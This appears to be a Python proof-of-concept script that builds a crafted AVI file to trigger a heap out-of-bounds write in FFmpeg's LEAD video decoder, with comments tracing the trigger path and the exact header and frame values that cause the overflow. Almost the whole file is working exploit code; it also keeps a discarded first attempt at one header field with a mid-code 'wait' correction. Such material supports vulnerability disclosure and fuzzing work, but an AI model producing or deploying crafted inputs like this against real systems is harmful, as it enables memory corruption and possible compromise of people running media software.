#!/usr/bin/env python3
"""
PoC generator for VULN 002: lead_decode_frame YUV420P heap OOB write
via unchecked height alignment (height=17, not a multiple of 16).

Trigger path:
  ffmpeg -i vuln_002_input.avi -f null -
  -> avformat_open_input() -> avi_read_packet()
  -> avcodec_send_packet() -> lead_decode_frame()
  -> decode_block() -> idct_put() [OOB heap write]

With height=17, format=0x1000 (YUV420P):
  mb_y loop bound: (17+15)//16 = 2  (mb_y = 0, 1)
  For luma blocks b=2,3 at mb_y=1:  y = 16*1 + 8*(2>>1) = 24
  idct_put writes 8 rows starting at row 24.
  Frame buffer only has 18 luma rows (height 17, aligned to 18).
  Max written row = 31, well past end of buffer => heap OOB write.
"""
import struct
import os

def make_chunk(fourcc, data):
    """Pack a RIFF chunk: fourcc(4) + size(4) + data (padded to even)."""
    if isinstance(fourcc, str):
        fourcc = fourcc.encode('ascii')
    size = len(data)
    chunk = fourcc + struct.pack('<I', size) + data
    if size % 2 == 1:
        chunk += b'\x00'
    return chunk

def make_list(subtype, data):
    """Pack a RIFF LIST chunk: LIST(4) + size(4) + subtype(4) + data."""
    if isinstance(subtype, str):
        subtype = subtype.encode('ascii')
    inner = subtype + data
    return make_chunk(b'LIST', inner)

# ── Dimensions ───────────────────────────────────────────────────────────────
WIDTH  = 16
HEIGHT = 17   # NOT a multiple of 16; triggers the OOB

# ── avih – Main AVI header (56 bytes) ────────────────────────────────────────
avih_data = struct.pack('<IIIIIIIIIIIIII',
    33333,    # dwMicroSecPerFrame (~30 fps)
    0,        # dwMaxBytesPerSec
    0,        # dwPaddingGranularity
    0x10,     # dwFlags  (AVIF_HASINDEX)
    1,        # dwTotalFrames
    0,        # dwInitialFrames
    1,        # dwStreams
    0,        # dwSuggestedBufferSize
    WIDTH,    # dwWidth
    HEIGHT,   # dwHeight
    0, 0, 0, 0,  # dwReserved[4]
)
assert len(avih_data) == 56, f"avih must be 56 bytes, got {len(avih_data)}"
avih_chunk = make_chunk('avih', avih_data)

# ── strh – Stream header (56 bytes) ──────────────────────────────────────────
strh_data = (
    b'vids'                        # fccType
    + b'LEAD'                      # fccHandler
    + struct.pack('<I', 0)         # dwFlags
    + struct.pack('<HH', 0, 0)     # wPriority, wLanguage
    + struct.pack('<I', 0)         # dwInitialFrames
    + struct.pack('<I', 1)         # dwScale
    + struct.pack('<I', 30)        # dwRate  (30 fps)
    + struct.pack('<I', 0)         # dwStart
    + struct.pack('<I', 1)         # dwLength
    + struct.pack('<I', 0)         # dwSuggestedBufferSize
    + struct.pack('<i', -1)        # dwQuality
    + struct.pack('<I', 0)         # dwSampleSize
    + struct.pack('<hhhh', 0, 0, WIDTH, HEIGHT)  # rcFrame
)
assert len(strh_data) == 56, f"strh must be 56 bytes, got {len(strh_data)}"
strh_chunk = make_chunk('strh', strh_data)

# ── strf – Stream format = BITMAPINFOHEADER (40 bytes) + 20 bytes extradata ──
# The LEAD codec init requires avctx->extradata_size >= 20.
# Extra bytes after BITMAPINFOHEADER in the strf chunk become extradata.
bmi_data = struct.pack('<IiiHHI',
    40,         # biSize
    WIDTH,      # biWidth
    HEIGHT,     # biHeight  (positive = bottom-up)
    1,          # biPlanes
    24,         # biBitCount
    0x44414544, # biCompression = 'DEAD'... wait, need 'LEAD'
)
# Fix: 'LEAD' as little-endian DWORD = 0x44414C45... actually struct wants bytes
# AVI FourCC 'LEAD' stored as bytes: L=0x4C, E=0x45, A=0x41, D=0x44
bmi_data = (
    struct.pack('<I', 40)           # biSize
    + struct.pack('<i', WIDTH)      # biWidth
    + struct.pack('<i', HEIGHT)     # biHeight
    + struct.pack('<H', 1)          # biPlanes
    + struct.pack('<H', 24)         # biBitCount
    + b'LEAD'                       # biCompression (FourCC)
    + struct.pack('<I', 0)          # biSizeImage
    + struct.pack('<i', 0)          # biXPelsPerMeter
    + struct.pack('<i', 0)          # biYPelsPerMeter
    + struct.pack('<I', 0)          # biClrUsed
    + struct.pack('<I', 0)          # biClrImportant
)
assert len(bmi_data) == 40, f"BITMAPINFOHEADER must be 40 bytes, got {len(bmi_data)}"
extradata = b'\x00' * 20   # 20 bytes of extradata (satisfies extradata_size >= 20 check)
strf_data = bmi_data + extradata
strf_chunk = make_chunk('strf', strf_data)

# ── strl LIST ─────────────────────────────────────────────────────────────────
strl_data = strh_chunk + strf_chunk
strl_list = make_list('strl', strl_data)

# ── hdrl LIST ─────────────────────────────────────────────────────────────────
hdrl_data = avih_chunk + strl_list
hdrl_list = make_list('hdrl', hdrl_data)

# ── Frame payload ─────────────────────────────────────────────────────────────
# lead_decode_frame reads:
#   buf[4..5] = format (LE uint16)  -- 0x1000 = YUV420P (non-zero branch)
#   buf[6..7] = q factor (LE uint16)
#   buf[8+]   = encoded bitstream (each byte XOR'd with 0x80)
#
# Size check: (avpkt->size - 8)*8 >= ceil(W/16)*ceil(H/16)*6*4 = 1*2*6*4 = 48
# So avpkt->size >= 14. We provide 8 header + 200 payload = 208 bytes (ample).
#
# Bitstream encoding (after XOR with 0x80):
#   We provide 0x80 bytes which become 0x00 after XOR.
#   All-zero bits decode as:
#     Luma DC:    code `00` (2 bits) -> size=0 (no delta)
#     Luma AC:    code `00` (2 bits) -> symbol=0 (EOB)
#     Chroma DC:  code `00` (2 bits) -> size=0
#     Chroma AC:  code `00` (2 bits) -> symbol=0 (EOB)
#   Each block costs 4 bits. 12 blocks * 4 bits = 48 bits = 6 bytes.
#   200 payload bytes give 1600 bits -- far more than needed.
#
# The OOB write triggers on blocks b=2 and b=3 of mb_y=1:
#   y = 16*1 + 8*(b>>1) = 24  for b=2,3
#   idct_put writes 8 rows starting at row 24.
#   YUV420P frame for height=17 has only 18 luma rows (aligned to even).
#   Rows 24-31 are past the end of the allocation => heap OOB write.

FORMAT_YUV420P = 0x1000   # triggers the non-zero YUV420P branch
Q_FACTOR       = 50       # neutral quantization

frame_header = (
    b'\x00\x00'                               # bytes 0-1 (unused by decoder)
    + b'\x00\x00'                             # bytes 2-3 (unused by decoder)
    + struct.pack('<H', FORMAT_YUV420P)       # bytes 4-5: format = 0x1000
    + struct.pack('<H', Q_FACTOR)             # bytes 6-7: q = 50
)
payload_bytes = b'\x80' * 200                # XOR -> 0x00 (all-zero bit stream)
frame_data = frame_header + payload_bytes

# ── movi LIST ─────────────────────────────────────────────────────────────────
frame_chunk = make_chunk('00dc', frame_data)
movi_data   = frame_chunk
movi_list   = make_list('movi', movi_data)

# ── idx1 – AVI index ──────────────────────────────────────────────────────────
# Offset is from start of movi LIST chunk (common FFmpeg interpretation).
# movi LIST starts after RIFF header (8) + 'AVI ' (4) + hdrl_list + movi header (8).
# The '00dc' chunk starts 4 bytes into movi data (after 'movi' fourcc).
# Many decoders accept offset=4 here; FFmpeg rebuilds index if needed.
movi_list_offset = 8 + 4 + len(hdrl_list)   # absolute byte offset of movi LIST
frame_chunk_offset_in_movi = 4              # past the 'movi' fourcc

idx1_entry = (
    b'00dc'                                  # ckid
    + struct.pack('<I', 0x10)                # dwFlags = AVIIF_KEYFRAME
    + struct.pack('<I', frame_chunk_offset_in_movi)  # dwChunkOffset
    + struct.pack('<I', len(frame_data))     # dwChunkSize
)
idx1_chunk = make_chunk('idx1', idx1_entry)

# ── RIFF AVI ──────────────────────────────────────────────────────────────────
avi_data = b'AVI ' + hdrl_list + movi_list + idx1_chunk
riff_chunk = make_chunk('RIFF', avi_data)

# ── Write output ──────────────────────────────────────────────────────────────
out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_002_input.avi')
with open(out_path, 'wb') as f:
    f.write(riff_chunk)

print(f"[+] Written {len(riff_chunk)} bytes to {out_path}")
print(f"    Width={WIDTH}, Height={HEIGHT}, Format=0x{FORMAT_YUV420P:04x}, Q={Q_FACTOR}")
print(f"    Frame payload: {len(frame_data)} bytes ({len(payload_bytes)} bytes of encoded data)")
print(f"    Expected: heap OOB write in luma plane at mb_y=1, b=2/3 (y=24, buffer has ~18 rows)")
